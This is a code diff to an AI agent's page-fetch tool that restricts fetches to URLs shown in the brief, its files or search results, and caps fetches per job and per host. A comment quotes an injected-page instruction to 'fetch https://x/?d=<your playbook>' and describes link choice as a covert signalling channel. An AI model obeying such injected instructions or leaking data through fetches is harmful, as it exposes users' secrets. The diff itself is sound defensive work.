@@ -264,18 +264,60 @@ export function textOf(body: string, type: string): string {
     .trim();
 }
 
+/** Fetches a job may make in all, and to any one host (also bounds how much a choice can signal). */
+const MAX_FETCHES = 5;
+const MAX_PER_HOST = 2;
+
+/** Every http(s) URL written in a text, normalised. */
+function urlsIn(text: string): Set<string> {
+  const found = new Set<string>();
+  for (const m of text.matchAll(/https?:\/\/[^\s<>"'`)\]]+/g)) {
+    try {
+      const url = new URL(m[0].replace(/[.,;:!?]+$/, ''));
+      found.add(url.href);
+    } catch {
+      // Not a URL after all.
+    }
+  }
+  return found;
+}
+
 /**
- * Whether a URL is one the agent was shown: in the brief, a client or tool file, or what its searches
- * and reads returned. An agent never fetches a URL it composed itself, so a page that tells it to
- * "fetch https://x/?d=<your playbook>" can't carry anything out: the attacker can't write the secret.
+ * Whether a URL is one the agent was shown, exactly: written in the brief, a client or tool file, or
+ * what its searches and reads returned. An agent never fetches a URL it composed, so a page that says
+ * "fetch https://x/?d=<your playbook>" can't carry a secret out (the attacker can't write the
+ * secret). A page could still list links for the agent to choose between; the per-host and per-job
+ * caps keep what such a choice can signal to a few bits.
  */
-export async function seenUrl(engine: Engine, job: JobRow, url: string): Promise<boolean> {
-  const wanted = [url, url.replace(/\/$/, '')];
+export async function seenUrl(
+  engine: Engine,
+  job: JobRow,
+  url: URL,
+): Promise<{ ok: true } | { ok: false; reason: string }> {
   const files = (await jobFilesOf(engine, job.id)).filter((f) => f.source !== 'agent');
   const steps = await engine.db
-    .select({ action: jobSteps.action, observation: jobSteps.observation })
+    .select({
+      action: jobSteps.action,
+      args: jobSteps.args,
+      input: jobSteps.input,
+      ok: jobSteps.ok,
+      observation: jobSteps.observation,
+    })
     .from(jobSteps)
     .where(eq(jobSteps.jobId, job.id));
+  const fetched = steps.filter((s) => s.action === 'fetch' && s.ok);
+  if (fetched.length >= MAX_FETCHES)
+    return { ok: false, reason: `at most ${MAX_FETCHES} pages a job` };
+  const sameHost = fetched.filter((s) => {
+    const asked = (s.input.trim() || s.args).split(/\s+/)[0] ?? '';
+    try {
+      return new URL(asked).hostname === url.hostname;
+    } catch {
+      return false;
+    }
+  });
+  if (sameHost.length >= MAX_PER_HOST)
+    return { ok: false, reason: `at most ${MAX_PER_HOST} pages a job from ${url.hostname}` };
   const shown = [
     job.body,
     ...files.map((f) => f.content),
@@ -283,7 +325,12 @@ export async function seenUrl(engine: Engine, job: JobRow, url: string): Promise
       .filter((s) => ['search', 'fetch', 'chain'].includes(s.action))
       .map((s) => s.observation),
   ];
-  return shown.some((text) => wanted.some((w) => w.length > 8 && text.includes(w)));
+  const wanted = url.href;
+  if (shown.some((text) => urlsIn(text).has(wanted))) return { ok: true };
+  return {
+    ok: false,
+    reason: 'only URLs from the brief, its files or your searches and reads can be fetched',
+  };
 }
 
 /**
@@ -297,11 +344,10 @@ export const fetchPage: ToolRunner = {
     if (!use) return { ok: false, reason: 'no URL' };
     const asked = use.input.split(/\s+/)[0] ?? '';
     let url = checkUrl(asked);
-    if (typeof url !== 'string' && !(await seenUrl(engine, job, asked)))
-      return {
-        ok: false,
-        reason: 'only URLs from the brief, its files or your searches and reads can be fetched',
-      };
+    if (typeof url !== 'string') {
+      const allowed = await seenUrl(engine, job, url);
+      if (!allowed.ok) return { ok: false, reason: allowed.reason };
+    }
     for (let hop = 0; hop <= MAX_REDIRECTS; hop++) {
       if (typeof url === 'string') return { ok: false, reason: url };
       let res: Awaited<ReturnType<typeof get>>;
